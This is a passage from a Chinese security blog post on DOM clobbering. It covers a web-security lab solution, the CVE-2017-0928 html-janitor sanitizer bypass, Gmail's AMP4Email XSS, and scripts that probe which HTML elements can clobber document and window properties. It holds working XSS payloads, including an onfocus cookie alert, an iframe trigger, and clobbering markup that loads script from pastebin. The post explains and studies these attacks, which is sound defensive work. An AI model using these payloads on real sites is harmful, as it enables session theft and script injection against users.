&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x4F7F;&#x7528;<code>name=attributes</code>&#x6210;&#x529F;&#x5730;&#x8986;&#x76D6;&#x4E86;&#x539F;&#x6765;&#x7684;<code>node.attributes</code>&#xFF0C;&#x6240;&#x4EE5;<code>node.attributes.length</code>&#x5728;&#x8FD9;&#x91CC;&#x7684;&#x503C;&#x4E3A;<code>undefined</code>&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x6CA1;&#x6709;&#x5F71;&#x54CD; JS &#x4EE3;&#x7801;&#x7684;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#x3002;</p><p>&#x6240;&#x4EE5;&#x660E;&#x767D;&#x4E86;&#x8FD9;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6709;<code>name=attributes</code>&#x7684;&#x5B50;&#x8282;&#x70B9;&#x7684; payload &#x7ED5;&#x8FC7;&#x5C5E;&#x6027;&#x7684; check &#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x5B9A;&#x7684;&#x767D;&#x540D;&#x5355;&#x6807;&#x7B7E;&#x4E5F;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; HTML Relationships &#x6765;&#x6784;&#x9020;&#x6211;&#x4EEC;&#x7684; payload</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63A5;&#x7740;&#x5C31;&#x662F;&#x6784;&#x9020; XSS &#x4E86;&#xFF0C;&#x6839;&#x636E;&#x9898;&#x76EE;&#x8981;&#x6C42;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x89E6;&#x53D1;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>tabindex</code>&#x5C5E;&#x6027;&#xFF0C;&#x914D;&#x5408;<code>form</code>&#x7684;<code>onfocus</code>&#x65F6;&#x95F4;&#x6765; XSS &#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x628A;&#x5B83;&#x5F53;&#x4F5C;&#x8BC4;&#x8BBA;&#x63D0;&#x4EA4;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png" alt></p><p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x4EA4;&#x7ED9;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x7684;&#x8BDD;&#x662F;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x8BC4;&#x8BBA;&#x662F;&#x7531; aJax &#x8BF7;&#x6C42;&#x62FF;&#x5230;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x7684;&#x8BDD;&#xFF0C;Dom &#x6811;&#x662F;&#x8FD8;&#x6CA1;&#x6709;&#x8BC4;&#x8BBA;&#x7684;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x7B49;&#x5F85; JS &#x6267;&#x884C;&#x5B8C;&#x6210;&#x624D;&#x4F1A;&#x6709;&#x8BC4;&#x8BBA;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5EF6;&#x65F6;&#x6216;&#x8005;&#x963B;&#x585E;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x662F;&#x5229;&#x7528;<code>iframe</code>&#x8FDB;&#x884C;<code>setTimeout</code></p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">https://your-lab-id.web-security-academy.net/post?postId</span>=<span class="hljs-string">3</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;setTimeout(a=&gt;this.src=this.src+&apos;#x&apos;,500)&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;&#x4E00;&#x5B9A;&#x8981;&#x5F97;&#x7B49;&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x518D;&#x7528;<code>#x</code>&#x9009;&#x62E9;<code>form</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684; 500ms &#x9700;&#x8981;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x7EDC;&#x60C5;&#x51B5;&#x9002;&#x5F53;&#x8C03;&#x6574;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png" alt></p><h3 id="CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering"><a href="#CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering" class="headerlink" title="CVE-2017-0928 Bypassing sanitization using DOM clobbering"></a>CVE-2017-0928 Bypassing sanitization using DOM clobbering</h3><p><a href="https://github.com/guardian/html-janitor/" target="_blank" rel="noopener">html-janitor</a> &#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E0A;&#x6587;&#x7528;&#x5230;&#x7684; HTML filters&#xFF0C;&#x5728; v2.0.2 &#x5F53;&#x4E2D;&#xFF0C;janitor &#x5728;&#x5FAA;&#x73AF;&#x4E2D;&#x6709;&#x8FD9;&#x4E48;&#x51E0;&#x884C;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">do</span> {</span><br><span class="line">  <span class="hljs-comment">// Ignore nodes that have already been sanitized</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (node._sanitized) {</span><br><span class="line">    <span class="hljs-keyword">continue</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">  <span class="hljs-comment">// Sanitize children</span></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(node);</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-comment">// Mark node as sanitized so it&apos;s ignored in future runs</span></span><br><span class="line">  node._sanitized = <span class="hljs-literal">true</span>;</span><br><span class="line">} <span class="hljs-keyword">while</span> ((node = treeWalker.nextSibling()));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;<code>_sanitized</code>&#x4F5C;&#x4E3A;&#x6807;&#x5FD7;&#x4F4D;&#x6765;&#x6807;&#x5FD7;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#xFF0C;&#x7531;&#x6211;&#x4EEC;&#x4E0A;&#x4E2A;&#x4F8B;&#x5B50;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E0E;&#x4E0A;&#x4E2A;&#x4F8B;&#x5B50;&#x7C7B;&#x4F3C;&#x7684; payload &#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A; if &#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x6807;&#x51C6;&#x5316;&#x8FC7;&#x6EE4;&#x4E86;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(document.domain)</span> <span class="hljs-attr">name</span>=<span class="hljs-string">_sanitized</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4FEE;&#x590D;&#x65B9;&#x6848;&#x662F;&#x5220;&#x9664;&#x4E86;&#x8FD9;&#x4E9B;&#x5224;&#x65AD;&#xFF0C;&#x5BF9;&#x5B50;&#x6811;&#x5229;&#x7528;&#x9012;&#x5F52;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#x8FC7;&#x6EE4;&#x3002;</p><h3 id="XSS-in-GMail&#x2019;s-AMP4Email-via-DOM-Clobbering"><a href="#XSS-in-GMail&#x2019;s-AMP4Email-via-DOM-Clobbering" class="headerlink" title="XSS in GMail&#x2019;s AMP4Email via DOM Clobbering"></a>XSS in GMail&#x2019;s AMP4Email via DOM Clobbering</h3><p>&#x7EC8;&#x4E8E;&#x5230;&#x4E86;&#x6211;&#x4EEC;&#x5F00;&#x5934;&#x63D0;&#x5230;&#x7684; OWASP Top 10 &#x63D0;&#x540D;&#x7684;&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#x4E86;&#xFF0C;&#x4F5C;&#x8005;&#x9996;&#x5148;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x5728;&#x63A7;&#x5236;&#x53F0;&#x8F93;&#x5165; window &#x8FDB;&#x884C; fuzz</p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png" alt></p><p>&#x8FD9;&#x91CC;&#x4ED6;&#x9996;&#x5148;&#x5229;&#x7528;&#x4E86;<code>AMP</code>&#xFF0C;&#x5C1D;&#x8BD5;&#x63D2;&#x5165;<code>&lt;a id=AMP&gt;</code>&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;<code>AMP</code>&#x88AB; ban &#x4E86;</p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png" alt></p><p>&#x63A5;&#x7740;&#x627E;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;<code>AMP_MODE</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;&#x88AB; ban &#xFF0C;&#x53CD;&#x800C;&#x8BA9;&#x4F5C;&#x8005;&#x53D1;&#x73B0;&#x4E86;&#x8FD9;&#x91CC;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#x7684; URL &#x5F53;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;<code>undefined</code></p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png" alt></p><p>&#x8FD9;&#x5C31;&#x662F;&#x4F5C;&#x8005;&#x63D2;&#x5165;&#x4E86;<code>&lt;a id=AMP_MODE&gt;</code>&#x5BFC;&#x81F4;&#x4EA7;&#x751F;&#x7684;<code>undefined</code>&#xFF0C;&#x4E3B;&#x8981;&#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x4EE3;&#x7801;&#x7ECF;&#x4F5C;&#x8005;&#x7B80;&#x5316;&#x540E;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">&quot;script&quot;</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> loc;</span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.test &amp;&amp; <span class="hljs-built_in">window</span>.testLocation) {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.testLocation</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.location;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.localDev) {</span><br><span class="line">    loc = loc.protocol + <span class="hljs-string">&quot;//&quot;</span> + loc.host + <span class="hljs-string">&quot;/dist&quot;</span></span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-string">&quot;https://cdn.ampproject.org&quot;</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">&quot;/&quot;</span> : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">b.src = loc + <span class="hljs-string">&quot;/rtv/&quot;</span> + AMP_MODE.rtvVersion; + <span class="hljs-string">&quot;/&quot;</span> + singlePass + <span class="hljs-string">&quot;v0/&quot;</span> + pluginName + <span class="hljs-string">&quot;.js&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5982;&#x679C;&#x518D;&#x8981;&#x7B80;&#x5316;&#x5230;&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">&quot;script&quot;</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line">b.src = <span class="hljs-built_in">window</span>.testLocation.protocol + <span class="hljs-string">&quot;//&quot;</span> +</span><br><span class="line">        <span class="hljs-built_in">window</span>.testLocation.host + <span class="hljs-string">&quot;/dist/rtv/&quot;</span> +</span><br><span class="line">        AMP_MODE.rtvVersion; + <span class="hljs-string">&quot;/&quot;</span> +</span><br><span class="line">        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">&quot;/&quot;</span> : <span class="hljs-string">&quot;&quot;</span>) +</span><br><span class="line">        <span class="hljs-string">&quot;v0/&quot;</span> + pluginName + <span class="hljs-string">&quot;.js&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; Dom Clobbering &#x6765;&#x8BA9;&#x5B83;&#x52A0;&#x8F7D;&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x7684; js &#x6587;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x52AB;&#x6301;<code>protocol</code>&#x5230;&#x6211;&#x4EEC;&#x4EFB;&#x610F; URL&#xFF0C;&#x518D;&#x5229;&#x7528;<code>#</code>&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;&#x5373;&#x53EF;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;localDev&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testLocation&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testLocation&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;protocol&quot;</span></span></span><br><span class="line"><span class="hljs-tag">   <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://pastebin.com/raw/0tn8z0rG#&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136; URL &#x6784;&#x9020;&#x51FA;&#x6765;&#x4E86;&#xFF0C;&#x4F46;&#x662F; Google &#x8FD8;&#x6709; CSP</p><p></p><figure class="highlight gams hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src <span class="hljs-string">&apos;none&apos;</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">script</span></span>-src <span class="hljs-string">&apos;sha512-oQwIl...==&apos;</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/rtv/</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0.js</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0/</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136;&#x4ED6;&#x5F53;&#x65F6;&#x6CA1;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F46;&#x662F; Google &#x8FD8;&#x662F;&#x5168;&#x989D;&#x5730;&#x7ED9;&#x4E86;&#x4ED6;&#x5956;&#x91D1;&#x3002;</p><p>&#x53E6;&#x5916;&#x8FD9;&#x4E2A; CSP &#x53EF;&#x4EE5;&#x5229;&#x7528;<code>..%252f</code>&#x7684; trick &#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x5C5E;&#x4E8E;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x4E86;&#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x81EA;&#x884C;&#x641C;&#x7D22;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x7531;&#x4E8E;&#x7BC7;&#x5E45;&#x5173;&#x7CFB;&#xFF0C;&#x5C31;&#x4E0D;&#x518D;&#x5217;&#x4E3E;&#x66F4;&#x591A;&#x7684;&#x4F8B;&#x5B50;&#x4E86;&#xFF0C;&#x6211;&#x4F1A;&#x628A;&#x6700;&#x8FD1;&#x81EA;&#x5DF1;&#x505A;&#x7684;&#x4E00;&#x4E9B; XSS Game &#x4E2D;&#x6D89;&#x53CA;&#x5230; Dom Clobbering &#x7684;&#x90E8;&#x5206;&#x4EE5; Tip &#x7684;&#x5F62;&#x5F0F;&#x5199;&#x51FA;&#x6765;&#x3002;</p><h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x63D0;&#x5230;&#x8FC7;&#x6216;&#x8BB8;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x67D0;&#x4E9B;&#x5C5E;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4E0D;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x6216;&#x8005;&#x8BF4;&#x5B8C;&#x5168;&#x63A7;&#x5236;<code>document.cookie</code>&#x5462;&#xFF1F;&#x7A76;&#x7ADF;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x54EA;&#x4E9B;&#x5462;&#xFF1F;&#x53C8;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x5229;&#x7528;&#x5462;&#xFF1F;&#x54EA;&#x4E9B;&#x53EF;&#x4EE5;&#x7528; ID &#x54EA;&#x4E9B;&#x7528; Name&#x5462;&#xFF1F;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;&#x54EA;&#x4E9B;&#x7528; id &#x54EA;&#x4E9B;&#x7528; name &#xFF1F;</p><h3 id="Document-amp-Id"><a href="#Document-amp-Id" class="headerlink" title="Document &amp; Id"></a>Document &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>) &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x53EA;&#x6709;<code>object</code>&#x6807;&#x7B7E;<code>document</code>&#x53EF;&#x4EE5;&#x901A;&#x8FC7; id &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Document-amp-Name"><a href="#Document-amp-Name" class="headerlink" title="Document &amp; Name"></a>Document &amp; Name</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;x&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x4E94;&#x4E2A;&#x5143;&#x7D20;&#x53EF;&#x4EE5;&#x8BA9;<code>document</code>&#x901A;&#x8FC7; name &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#xA0;[<span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Document-amp-Name-amp-Id"><a href="#Document-amp-Name-amp-Id" class="headerlink" title="Document &amp; Name &amp; Id"></a>Document &amp; Name &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x name=y &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    <span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;y&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br><span class="line">  ) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x4E0B;&#x4E09;&#x4E2A;&#x5143;&#x7D20;&#xFF1A;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-amp-Id"><a href="#Window-amp-Id" class="headerlink" title="Window &amp; Id"></a>Window &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 